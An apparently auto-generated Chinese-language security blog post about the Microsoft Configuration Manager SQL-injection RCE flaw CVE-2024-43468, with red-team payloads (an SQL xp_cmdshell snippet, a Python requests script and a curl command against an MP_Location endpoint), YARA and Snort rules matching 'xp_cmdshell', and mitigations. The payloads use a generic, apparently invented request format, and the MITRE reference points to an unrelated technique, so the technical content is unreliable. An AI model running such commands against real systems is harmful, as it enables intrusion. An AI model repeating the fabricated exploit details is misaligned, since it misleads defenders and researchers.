---
layout: post
title:  "Microsoft Configuration Manager的2024年RCE漏洞正遭到濫用"
date:   2026-02-16 12:47:11 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Microsoft Configuration Manager 遠端程式碼執行漏洞 (CVE-2024-43468) 利用與防禦
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `SQL Injection`, `xp_cmdshell`, `Deserialization`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 漏洞出於 Microsoft Configuration Manager 的 MP_Location 服務對資料庫查詢輸入的驗證不當，導致 `getMachineID` 及 `getContentID` 函式成為攻擊媒介。
* **攻擊流程圖解**: 
    1. 攻擊者送出惡意 SQL 查詢至 MP_Location 服務。
    2. 服務未能正確驗證輸入，導致 SQL Injection。
    3. 攻擊者利用 `xp_cmdshell` 程序執行遠端命令。
* **受影響元件**: Microsoft Configuration Manager (版本未指定，但已知於 2024 年 10 月發布更新修補)。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要對目標系統具有網路存取權限。
* **Payload 建構邏輯**:

    ```
    
    sql
        -- 範例惡意 SQL 查詢
        DECLARE @sql NVARCHAR(4000)
        SET @sql = 'xp_cmdshell ''whoami'''
        EXEC sp_executesql @sql
    
    ```
 

```

python
    # 範例 Python Payload
    import requests

    url = 'https://example.com/MP_Location'
    payload = {'query': 'xp_cmdshell \'whoami\''}
    response = requests.post(url, data=payload)
    print(response.text)

```
* **範例指令**:

    ```
    
    bash
        curl -X POST \
        https://example.com/MP_Location \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        -d 'query=xp_cmdshell%20%27whoami%27'
    
    ```
* **繞過技術**: 可能需要繞過 WAF 或 EDR 的檢測，具體方法取決於目標系統的安全設定。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| *未提供* | *未提供* | *未提供* | *未提供* |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
        rule Microsoft_Configuration_Manager_RCE {
            meta:
                description = "Detects Microsoft Configuration Manager RCE"
                author = "Your Name"
            strings:
                $sql_injection = "xp_cmdshell"
            condition:
                $sql_injection
        }
    
    ```
 

```

snort
    alert tcp any any -> any 80 (msg:"Microsoft Configuration Manager RCE"; content:"xp_cmdshell"; sid:1000001;)

```
* **緩解措施**: 
    1. 更新 Microsoft Configuration Manager 至最新版本。
    2. 限制 MP_Location 服務的存取權限。
    3. 監控系統日誌以偵測可疑活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **SQL Injection (SQL 注入)**: 想像你在問一個問題，但問題的內容可以被攻擊者修改，導致系統做出意外的動作。技術上是指攻擊者將惡意的 SQL 代碼注入到應用程式的查詢中，從而執行未經授權的 SQL 命令。
* **Deserialization (反序列化)**: 想像你收到一個包裹，包裹內的東西需要被解開才能使用。技術上是指將資料從序列化的形式（如 JSON 或二進制資料）轉換回程式碼可以使用的形式，若未經過適當的驗證，可能導致安全漏洞。
* **xp_cmdshell (存儲過程)**: 一個 Microsoft SQL Server 的存儲過程，允許執行命令提示符命令。若未經過適當的限制，可能被攻擊者利用執行惡意命令。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/173969)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/) - 這裡提供了與遠端程式碼執行相關的攻擊技術詳細信息。


